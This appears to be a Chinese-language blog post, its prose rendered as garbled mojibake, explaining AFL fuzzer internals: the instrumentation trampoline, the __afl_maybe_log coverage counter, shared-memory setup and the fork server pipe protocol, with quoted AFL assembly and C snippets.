<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"><span class="comment">// fprtinf</span></span><br><span class="line"><span class="comment">// å…¶ä¸­R(MAP_SIZE))æ˜¯ecx/rcxè¦è®¾ç½®çš„å€¼ %08xã€‚</span></span><br><span class="line"><span class="comment">// MAP_SIZEå®šä¹‰ä¸º64Kï¼ŒR(x)å®šä¹‰ä¸º(random() % (x)) ï¼Œæ•…R(MAP_SIZE))ä¸º0~64Kçš„ä¸€ä¸ªéšæœºæ•°ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span>   </span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="main-payload"><a href="#main-payload" class="headerlink" title="main_payload"></a>main_payload</h2><p>ç¨‹åºæœ«å°¾æ’å…¥<code>main_payload</code></p>
<p>æ¯”è¾ƒé•¿ï¼Œæ¨èåœ¨IDAç­‰å·¥å…·é‡Œçœ‹ä¸€ä¸‹CFG</p>
<h3 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log"></a>__afl_maybe_log</h3><p>afl_maybe_log</p>
<ul>
<li>lahfï¼šload ah with flagsï¼Œå°†eflagså¯„å­˜å™¨çš„å€¼åŠ è½½åˆ°ah</li>
<li>seto %alè®°å½•æ­¤æ—¶OF(æº¢å‡ºæ ‡å¿—)çš„çŠ¶æ€ï¼Œå½“æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æ­¤æ ‡å¿—ä½ç½®ä½æ—¶ï¼Œå°†ALå¯„å­˜å™¨ç½®ä½</li>
<li>ä»æ³¨é‡Šå¯ä»¥çœ‹å‡ºæ¥ï¼š__afl_maybe_log å…ˆæ£€æŸ¥å…±äº«å†…å­˜åŒºåŸŸæ˜¯å¦å·²ç»æ˜ å°„ã€‚<ul>
<li>å¦‚æœè¿˜æœªæ˜ å°„ï¼Œåˆ™è·³è½¬åˆ° __afl_setup è¿›è¡Œåˆå§‹åŒ–ï¼›</li>
<li>å¦åˆ™ç»§ç»­æ‰§è¡Œ __afl_store é€»è¾‘ï¼Œrdx å¯„å­˜å™¨æŒ‡å‘å…±äº«å†…å­˜åŒºå—ã€‚</li>
</ul>
</li>
</ul>
<p>é¦–å…ˆä¼šåˆ¤æ–­<code>__afl_area_ptr</code> æ˜¯å¦åˆå§‹åŒ–ï¼Œå¦åˆ™å°±ä¼šè¿›å…¥<code>afl_setup</code> å‡è®¾å·²ç»åˆå§‹åŒ–</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_maybe_log:</span><br><span class="line"></span><br><span class="line">  lahf</span><br><span class="line">  seto  %al</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if SHM region is already mapped. */</span></span><br><span class="line"></span><br><span class="line">  movq  __afl_area_ptr(%rip), %rdx</span><br><span class="line">  testq %rdx, %rdx</span><br><span class="line">  je    __afl_setup</span><br><span class="line"></span><br><span class="line">__afl_store:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Calculate and store hit for the code location specified in rcx. */</span></span><br><span class="line">  xorq __afl_prev_loc(%rip), %rcx</span><br><span class="line">  xorq %rcx, __afl_prev_loc(%rip)</span><br><span class="line">  shrq $<span class="number">1</span>, __afl_prev_loc(%rip)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">incb</span> (%rdx, %rcx, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">__afl_return:</span><br><span class="line"></span><br><span class="line">  addb $<span class="number">127</span>, %al</span><br><span class="line">  sahf</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>

<p><code>__afl_maybe_log</code> å…ˆæ£€æŸ¥å…±äº«å†…å­˜åŒºåŸŸæ˜¯å¦å·²ç»æ˜ å°„ã€‚å¦‚æœè¿˜æœªæ˜ å°„ï¼Œåˆ™è·³è½¬åˆ° __afl_setup è¿›è¡Œåˆå§‹åŒ–ï¼›å¦åˆ™ç»§ç»­æ‰§è¡Œ __afl_store é€»è¾‘ï¼Œrdx å¯„å­˜å™¨æŒ‡å‘å…±äº«å†…å­˜åŒºå—ã€‚</p>
<p><code>__afl_store</code> æ‰§è¡Œè¿‡ç¨‹ä¸ºï¼š</p>
<ul>
<li>å°†ç›®å‰å­˜å‚¨ç€ cur_location çš„ rcx å¯„å­˜å™¨å¼‚æˆ–ä¸Š prev_loc</li>
<li>å°† prev_loc è®¾ä¸º cur_loc ï¼ˆè¿™é‡Œåˆ©ç”¨äº†å¼‚æˆ–è¿ç®—çš„è‡ªåæ€§ï¼‰</li>
<li>å°† prev_loc å³ç§»ä¸€ä½</li>
<li>å¢åŠ  hit count</li>
</ul>
<p>éå¸¸å·§å¦™çš„ä»£ç è¦†ç›–ç‡æµ‹é‡ï¼šCoverage measurements <a href="https://xidoo.top/2022/01/afl-white-book/">(1)</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›è¿‡ç¨‹æ‰§è¡Œå®Œåï¼Œæ¢å¤ eflags å¹¶è¿”å›ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å¼„æ¸…äº†æ’å…¥åˆ°åŸºæœ¬å—èµ·å§‹å¤„çš„æ¡©ä»£ç çš„é€»è¾‘ã€‚</p>
<h3 id="afl-setup"><a href="#afl-setup" class="headerlink" title="__afl_setup"></a>__afl_setup</h3><p>æ²¡æœ‰åˆ›å»ºå…±äº«å†…å­˜ï¼Œä¼šè·³è½¬åˆ°è¿™é‡Œåˆ›å»ºä¸€å—å…±äº«å†…å­˜</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_setup:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do not retry setup if we had previous failures. */</span></span><br><span class="line"></span><br><span class="line">  cmpb $<span class="number">0</span>, __afl_setup_failure(%rip)</span><br><span class="line">  jne __afl_return</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check out if we have a global pointer on file. */</span></span><br><span class="line"></span><br><span class="line">  movq  __afl_global_area_ptr@<span class="built_in">GOTPCREL</span>(%rip), %<span class="function">rdx</span></span><br><span class="line"><span class="function">  <span class="title">movq</span>  <span class="params">(%rdx)</span>, %rdx</span></span><br><span class="line"><span class="function">  <span class="comment">/* åˆ¤æ–­æ˜¯å¦æ˜¯0 ä¹Ÿå°±æ˜¯æ²¡æœ‰åˆ›å»º*/</span></span></span><br><span class="line"><span class="function">  testq %rdx, %rdx</span></span><br><span class="line"><span class="function">  je    __afl_setup_first</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq %rdx, __<span class="title">afl_area_ptr</span><span class="params">(%rip)</span></span></span><br><span class="line"><span class="function">  jmp  __afl_store</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* å®ƒé¦–å…ˆæŠŠä¸€äº› caller-save å¯„å­˜å™¨ä¿å­˜åœ¨æ ˆä¸Šï¼ˆè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿åç»­åœ¨ fork server ä¸­æ¢å¤åŸæœ‰å¯„å­˜å™¨çŠ¶æ€ï¼‰ã€‚*/</span></span></span><br><span class="line"><span class="function">__afl_setup_first:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  /* Save everything that is not yet saved and that may be touched by</span></span><br><span class="line"><span class="function">     getenv() and several other libcalls we<span class="string">&#x27;ll be relying on. */</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* é¦–å…ˆä¿å­˜æ‰€æœ‰çš„å¯„å­˜å™¨ */</span></span></span><br><span class="line"><span class="string"><span class="function">  leaq -352(%rsp), %rsp</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rax,   0(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rcx,   8(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rdi,  16(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rsi,  32(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r8,   40(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r9,   48(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r10,  56(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r11,  64(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm0,  96(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm1,  112(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm2,  128(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm3,  144(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm4,  160(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm5,  176(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm6,  192(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm7,  208(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm8,  224(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm9,  240(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm10, 256(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm11, 272(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm12, 288(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm13, 304(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm14, 320(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm15, 336(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;</span>ll keep the</span></span><br><span class="line"><span class="function">     original stack ptr in the callee-saved r12. */</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  pushq %r12</span></span><br><span class="line"><span class="function">  movq  %rsp, %r12</span></span><br><span class="line"><span class="function">  subq  $<span class="number">16</span>, %rsp</span></span><br><span class="line"><span class="function">  andq  $<span class="number">0xfffffffffffffff0</span>, %rsp</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  leaq .AFL_SHM_ENV(%rip), %rdi</span></span><br><span class="line"><span class="function">call getenv@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  testq %rax, %rax</span></span><br><span class="line"><span class="function">  je    __afl_setup_abort</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq  %rax, %rdi</span></span><br><span class="line"><span class="function">call atoi@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  xorq %rdx, %rdx   /* shmat flags    */</span></span><br><span class="line"><span class="function">  xorq %rsi, %rsi   /* requested addr */</span></span><br><span class="line"><span class="function">  movq %rax, %rdi   /* SHM ID: è¿™ä¸ªIDæ˜¯ç”±ç¯å¢ƒå˜é‡æŒ‡å®šçš„         */</span></span><br><span class="line"><span class="function">call shmat@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  cmpq $<span class="number">-1</span>, %rax</span></span><br><span class="line"><span class="function">  je   __afl_setup_abort</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  /* Store the address of the SHM region. */</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq %rax, %rdx</span></span><br><span class="line"><span class="function">  movq %rax, __afl_area_ptr(%rip)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx</span></span><br><span class="line"><span class="function">  movq %rax, (%rdx)</span></span><br><span class="line"><span class="function">  movq %rax, %rdx</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨ getenv(â€œ__AFL_SHM_IDâ€)ï¼Œå¦‚æœè¿”å› 0 åˆ™è¿›å…¥ __afl_setup_abort é”™è¯¯å¤„ç†æµç¨‹ï¼Œå¦åˆ™å¾€ä¸‹ç»§ç»­æ‰§è¡Œã€‚æˆ‘ä»¬å…ˆå»çœ‹é”™è¯¯å¤„ç†æµç¨‹</p>
<ul>
<li>å°±æ˜¯æŠŠ __afl_setup_failure å˜é‡è‡ªå¢ï¼Œè¿˜åŸæ‰€æœ‰å¯„å­˜å™¨å¹¶è¿”å›ã€‚</li>
<li>å¦‚æœç¯å¢ƒå˜é‡ __AFL_SHM_ID ä¸å­˜åœ¨ï¼Œåˆ™å…±äº«å†…å­˜çš„åˆå§‹åŒ–ä¼šå¤±è´¥</li>
<li>ä½†æ•´ä¸ªæ¡©ä»£ç å¯¹äºç›®æ ‡ç¨‹åºæ˜¯é€æ˜çš„â€”â€”æ— éæ˜¯ä¿å­˜äº†ä¸€äº›å¯„å­˜å™¨ã€æ‰§è¡Œäº†ä¸€äº›æ— å‰¯ä½œç”¨çš„ä»£ç ã€æœ€åæ¢å¤å¯„å­˜å™¨â€”â€”å› æ­¤ç›®æ ‡ç¨‹åºå¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚</li>
<li>è¿™ç‰‡è™šæ‹Ÿå†…å­˜æ˜¯ä»€ä¹ˆæ—¶å€™åˆ›å»ºçš„ï¼Ÿç­”æ¡ˆæ˜¯ afl-fuzz åœ¨ setup_shm() æµç¨‹ä¸­è°ƒç”¨ shmget() åˆ›å»ºäº†è™šæ‹Ÿå†…å­˜ï¼Œå¹¶å°† shm id å†™å…¥ __AFL_SHM_ID ç¯å¢ƒå˜é‡ã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_setup_abort:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Record setup failure so that we don&#x27;t keep calling</span></span><br><span class="line"><span class="comment">     shmget() / shmat() over and over again. */</span></span><br><span class="line"></span><br><span class="line">  incb __afl_setup_failure(%rip)</span><br><span class="line"></span><br><span class="line">  movq %r12, %rsp</span><br><span class="line">  popq %r12</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">0</span>(%rsp), %rax</span><br><span class="line">  movq  <span class="number">8</span>(%rsp), %rcx</span><br><span class="line">  movq <span class="number">16</span>(%rsp), %rdi</span><br><span class="line">  movq <span class="number">32</span>(%rsp), %rsi</span><br><span class="line">  movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">  movq <span class="number">48</span>(%rsp), %r9</span><br><span class="line">  movq <span class="number">56</span>(%rsp), %r10</span><br><span class="line">  movq <span class="number">64</span>(%rsp), %r11</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">96</span>(%rsp), %xmm0</span><br><span class="line">  movq <span class="number">112</span>(%rsp), %xmm1</span><br><span class="line">  movq <span class="number">128</span>(%rsp), %xmm2</span><br><span class="line">  movq <span class="number">144</span>(%rsp), %xmm3</span><br><span class="line">  movq <span class="number">160</span>(%rsp), %xmm4</span><br><span class="line">  movq <span class="number">176</span>(%rsp), %xmm5</span><br><span class="line">  movq <span class="number">192</span>(%rsp), %xmm6</span><br><span class="line">  movq <span class="number">208</span>(%rsp), %xmm7</span><br><span class="line">  movq <span class="number">224</span>(%rsp), %xmm8</span><br><span class="line">  movq <span class="number">240</span>(%rsp), %xmm9</span><br><span class="line">  movq <span class="number">256</span>(%rsp), %xmm10</span><br><span class="line">  movq <span class="number">272</span>(%rsp), %xmm11</span><br><span class="line">  movq <span class="number">288</span>(%rsp), %xmm12</span><br><span class="line">  movq <span class="number">304</span>(%rsp), %xmm13</span><br><span class="line">  movq <span class="number">320</span>(%rsp), %xmm14</span><br><span class="line">  movq <span class="number">336</span>(%rsp), %xmm15</span><br><span class="line"></span><br><span class="line">  leaq <span class="number">352</span>(%rsp), %rsp</span><br><span class="line"></span><br><span class="line">  jmp __afl_return</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå­˜åœ¨ç¯å¢ƒå˜é‡ï¼Œå°±ä¼šè°ƒç”¨ <code>shmat(shmid, 0, 0)</code>,å°†å…±äº«å†…å­˜åŒºåŸŸçš„åœ°å€å­˜è¿› __afl_area_ptrï¼Œå¹¶å†™è¿› GOT è¡¨ä¸­çš„ __afl_global_area_ptr æ¡ç›®ã€‚</p>
<ul>
<li><code>__afl_area_ptr</code> æ˜¯ä¸€ä¸ª lcommï¼Œè€Œ <code>__afl_global_area_ptr</code> æ˜¯ä¸€ä¸ª comm ã€‚</li>
<li>lcomm æœ‰ç‚¹ç±»ä¼¼äºå…¨å±€ static å˜é‡ï¼Œä¸åŒæ–‡ä»¶ä¸­çš„é‡å lcomm æ˜¯æŒ‡å‘ä¸åŒçš„åœ°å€ï¼›ä½† comm æœ‰ç‚¹ç±»ä¼¼äºå…¨å±€å˜é‡ï¼Œä¸åŒæ–‡ä»¶ä¸­çš„é‡å comm æŒ‡å‘åŒä¸€ä¸ªåœ°å€</li>
<li>å‡å¦‚ç›®æ ‡ç¨‹åºæ˜¯å¤šä»½ä»£ç é“¾æ¥å½¢æˆçš„ï¼Œé‚£ä¹ˆï¼Œæ¯ä»½æ±‡ç¼–æ–‡ä»¶éƒ½æ‹¥æœ‰ AFL main payloadï¼›å¯¹äºç¼–è¯‘å‡ºçš„æ¯ä¸ªä»£ç ç‰‡æ®µï¼Œéƒ½ä¼šæœ‰è‡ªå·±å¯¹åº”çš„ __afl_area_ptr ã€‚</li>
<li>ä½† __afl_global_area_ptr åªæœ‰ä¸€ä»½ï¼Œåªéœ€è¦ä¼˜å…ˆå‚è€ƒ __afl_global_area_ptr ï¼Œå°±èƒ½è®©æ‰€æœ‰æ¡©ä»£ç è®¿é—®çš„ shm ä¿æŒä¸€è‡´ã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.AFL_VARS:</span><br><span class="line"></span><br><span class="line">  .lcomm   __afl_area_ptr, <span class="number">8</span></span><br><span class="line">  .lcomm   __afl_prev_loc, <span class="number">8</span></span><br><span class="line">  .lcomm   __afl_fork_pid, <span class="number">4</span></span><br><span class="line">  .lcomm   __afl_temp, <span class="number">4</span></span><br><span class="line">  .lcomm   __afl_setup_failure, <span class="number">1</span></span><br><span class="line">  .comm    __afl_global_area_ptr, <span class="number">8</span>, <span class="number">8</span></span><br><span class="line"></span><br><span class="line">.AFL_SHM_ENV:</span><br><span class="line">  .asciz <span class="string">&quot;__AFL_SHM_ID&quot;</span></span><br></pre></td></tr></table></figure>

<p>æœ€åï¼Œç”¨ <code>rdx</code> å¯„å­˜å™¨å­˜æ”¾å…±äº«å†…å­˜åœ°å€ï¼Œè¿›å…¥ fork serverã€‚</p>
<h4 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h4><p>execve() çš„æ•ˆç‡æ¯”è¾ƒä½ã€‚fuzzer éœ€è¦é«˜é¢‘ç‡åœ°æ‰§è¡Œç›®æ ‡ç¨‹åºï¼Œæ˜¾ç„¶ä¸å®œåœ¨ execve() ä¸Šæµªè´¹è¿‡å¤šæ—¶é—´ã€‚</p>
<p>AFL çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨ fork serverï¼š</p>
<p>è®©ç¨‹åºåœ¨ç¬¬ä¸€ä¸ªåŸºæœ¬å—å¤„åœä¸‹ï¼Œç­‰å¾… fuzzer å‘é€æŒ‡ä»¤ï¼›æ”¶åˆ°æŒ‡ä»¤åç»§ç»­æ‰§è¡Œç¨‹åºï¼›</p>
<p>æ‰§è¡Œå®Œæ¯•åï¼Œæ¢å¤ fork æ—¶çš„çŠ¶æ€ã€‚AFLé«˜æ•ˆçš„å®ç°è¿™ä¸€éœ€æ±‚ã€‚</p>
<ul>
<li>æŠŠ shm åœ°å€è¿ç»­å‹æ ˆä¸¤æ¬¡ï¼ˆä»¥ä¿è¯ esp ä»ç„¶æ˜¯ 16 çš„å€æ•°ï¼‰ï¼Œç„¶åè°ƒç”¨ <code>write(FORKSRV_FD+1, __afl_temp, 4)</code>ã€‚<ul>
<li>config.h ä¸­çš„ FORKSRV_FD å¸¸é‡ï¼Œfork server ä½¿ç”¨ 198ã€199 è¿™ä¸¤ä¸ª fd ä¼ é€’æŒ‡ä»¤ã€‚</li>
<li>__afl_temp æ˜¯ bss æ®µçš„é•¿åº¦ 4 å­—èŠ‚çš„å˜é‡ã€‚</li>
<li>ä½¿ç”¨pipeåœ¨è¿›ç¨‹é—´é€šä¿¡ï¼Œè¿™ä¸ªpipeåœ¨afl-fuzzæ—¶è¿›è¡Œåˆ›å»º</li>
</ul>
</li>
<li>å¦‚æœè¿™å››ä¸ªå­—èŠ‚å†™å…¥å¤±è´¥ï¼ˆwrite() çš„è¿”å›ä¸ç­‰äº 4ï¼‰ï¼Œåˆ™ç›´æ¥è¿›å…¥ __afl_fork_resume é€»è¾‘ï¼›å¦åˆ™ï¼Œè¿›å…¥ __afl_fork_wait_loop é€»è¾‘ã€‚</li>
</ul>
<p><a href="https://rk700.github.io/2017/12/28/afl-internals/">afl-fuzzåˆå§‹åŒ–pipe</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// st_pipe: status pipe</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥forkserver</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_forkserver:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Enter the fork server mode to avoid the overhead of execve() calls. We</span></span><br><span class="line"><span class="comment">     push rdx (area ptr) twice to keep stack alignment neat. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* %rdx å†…ä¿å­˜ shm åœ°å€ */</span></span><br><span class="line">  pushq %rdx</span><br><span class="line">  pushq %rdx</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phone home and tell the parent that we&#x27;re OK. (Note that signals with</span></span><br><span class="line"><span class="comment">     no SA_RESTART will mess it up). If this fails, assume that the fd is</span></span><br><span class="line"><span class="comment">     closed because we were execve()d from an instrumented binary, or because</span></span><br><span class="line"><span class="comment">     the parent doesn&#x27;t want to use the fork server. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¾€st_pipeé‡Œå†™å…¥æ•°æ®ï¼Œè¡¨ç¤ºforkserverå¯åŠ¨æˆåŠŸï¼Œé€šçŸ¥fuzzer</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $<span class="string">&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;</span>, %rdi       <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"></span><br><span class="line">  cmpq $<span class="number">4</span>, %rax</span><br><span class="line">  jne  __afl_fork_resume</span><br><span class="line"></span><br><span class="line">__afl_fork_wait_loop:</span><br></pre></td></tr></table></figure>

<p>å†™å…¥æˆåŠŸï¼Œä¼šè¿›å…¥ <code>__afl_fork_wait_loop</code></p>
<ul>
<li>readè¯»å–<code>ctl_pipe</code>ï¼Œå¦‚æœæ²¡æˆåŠŸè¿›å…¥<code>__afl_die</code></li>
<li>æˆåŠŸäº†ï¼Œè°ƒç”¨fork</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_fork_wait_loop:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// read ctl_pipe æ•°æ®ï¼Œä»fuzzerè¯»å–</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $<span class="string">&quot; STRINGIFY(FORKSRV_FD) &quot;</span>, %rdi             <span class="comment">/* file desc */</span></span><br><span class="line">call read@PLT</span><br><span class="line">  cmpq $<span class="number">4</span>, %rax</span><br><span class="line">  jne  __afl_die</span><br><span class="line">call fork@PLT</span><br><span class="line">  cmpq $<span class="number">0</span>, %rax</span><br><span class="line">  jl   __afl_die</span><br><span class="line">  je   __afl_fork_resume</span><br></pre></td></tr></table></figure>

<p>å¯¹äºçˆ¶è¿›ç¨‹ï¼Œåˆ™ç»§ç»­æ‰§è¡Œä»¥ä¸‹é€»è¾‘ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* In parent process: write PID to pipe, then wait for child. */</span></span><br><span class="line"></span><br><span class="line">  movl %eax, __afl_fork_pid(%rip)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å†™å…¥st_pipeï¼Œé€šçŸ¥fuzzerè¿›ç¨‹ pid æ˜¯å¤šå°‘</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx                   <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_fork_pid(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi             <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"> <span class="comment">// waitpidç­‰å¾…å­è¿›ç¨‹ç»“æŸ</span></span><br><span class="line">  movq $<span class="number">0</span>, %rdx                   <span class="comment">/* no flags  */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi     <span class="comment">/* status    */</span></span><br><span class="line">  movq __afl_fork_pid(%rip), %rdi <span class="comment">/* PID       */</span></span><br><span class="line">call waitpid@PLT</span><br><span class="line">  cmpq $<span class="number">0</span>, %rax</span><br><span class="line">  jle  __afl_die</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Relay wait status to pipe, then loop back. */</span></span><br><span class="line">  <span class="comment">// st_pipeï¼Œå‘Šè¯‰fuzzerå­è¿›ç¨‹ç»“æŸ</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $(<span class="number">198</span> + <span class="number">1</span>), %rdi         <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"></span><br><span class="line">  jmp  __afl_fork_wait_loop</span><br></pre></td></tr></table></figure>

<p>å¯¹äºå­è¿›ç¨‹ï¼Œè·³è½¬åˆ° <code>__afl_fork_resume</code></p>
<ul>
<li>å…³é—­æè¿°ç¬¦ï¼Œæ¢å¤å¯„å­˜å™¨</li>
<li>è°ƒæ•´spæŒ‡é’ˆï¼Œè®©ç¨‹åºç»§ç»­æ‰§è¡Œ</li>
</ul>
